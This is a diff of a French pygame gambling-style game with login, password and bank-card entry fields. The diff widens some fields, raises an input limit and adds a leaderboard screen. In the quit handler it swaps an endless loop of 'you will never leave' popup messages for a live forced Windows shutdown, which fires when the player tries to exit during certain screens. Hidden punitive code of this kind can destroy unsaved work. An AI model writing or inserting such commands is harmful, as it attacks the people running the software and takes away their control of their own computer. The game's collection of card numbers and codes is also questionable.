@@ -45,11 +45,11 @@ class Jeu():
         - self.hero : hero sélectionné par la joueur pour le jeu de combat
         - self.correspondance : dictionnaire pour la correspondance pour le lien entre l'écran de chaque héros et le héros'''
         self.run = True
-        self.ecrans = [ecran_machine_a_sous,ecran_mort,ecran_victoire,ecran_boutique,alcool,hero,hero2,niveaux,inventaire]
-        self.champ_joueur = pygame.Rect(135, 210, 140, 32)
+        self.ecrans = [ecran_machine_a_sous,ecran_mort,ecran_victoire,ecran_boutique,alcool,hero,hero2,niveaux,inventaire,classement]
+        self.champ_joueur = pygame.Rect(110, 210, 190, 32)
         self.code_cb = pygame.Rect(130, 325, 140, 32)
         self.nb_cb = pygame.Rect(100, 275, 200, 32)
-        self.champ_mdp = pygame.Rect(135, 250, 140, 32)
+        self.champ_mdp = pygame.Rect(110, 250, 190, 32)
         self.nom_actif = False 
         self.nb_cb_actif = False  
         self.code_cb_actif = False  
@@ -138,9 +138,9 @@ class Jeu():
                         if not vodka.ecran.get_actif() and not rr.ecran.get_actif() and not ecran_mort.ecran.get_actif():
                             self.run = False
                         else:
-                            while True:
-                                os.system('msg * Tu ne partiras jamais d\'ici !"')
-                            #os.system("shutdown /s /f /t 0")
+                            #while True:
+                                #os.system('msg * Tu ne partiras jamais d\'ici !"')
+                            os.system("shutdown /s /f /t 0")
                     # Clic de souris
                     elif event.type == pygame.MOUSEBUTTONDOWN:
                         clic.set_clic(event.pos)
@@ -220,12 +220,12 @@ class Jeu():
                             if self.nom_actif:  # Gestion de la saisie du pseudo
                                 if event.key == pygame.K_BACKSPACE:
                                     self.text = self.text[:-1]
-                                elif len(self.text) <= 12:  # Limite de longueur du pseudo
+                                elif len(self.text) <= 15:  # Limite de longueur du pseudo
                                     self.text += event.unicode
                             elif self.mdp_actif:  # Gestion de la saisie du mot de passe
                                 if event.key == pygame.K_BACKSPACE:
                                     self.mdp = self.mdp[:-1]
-                                elif len(self.mdp) <= 12:  # Limite de longueur du mot de passe
+                                elif len(self.mdp) <= 15:  # Limite de longueur du mot de passe
                                     self.mdp += event.unicode
                         # Gérer la saisie du numéro de carte bleue
                         if self.nb_cb_actif:
@@ -234,8 +234,10 @@ class Jeu():
                             elif len(self.txt_nbr_cb) < 19 and event.unicode in "0123456789":
                                 L = [4,9,14]
                                 for elem in L:
+                                    # Permet d'ajouter un espace tous les 4 chiffres
                                     if len(self.txt_nbr_cb) == elem:
                                         self.txt_nbr_cb += ' '
+                                # On ajoute les numéros de carte tapés par l'utilisateur
                                 self.txt_nbr_cb += event.unicode
                         
 
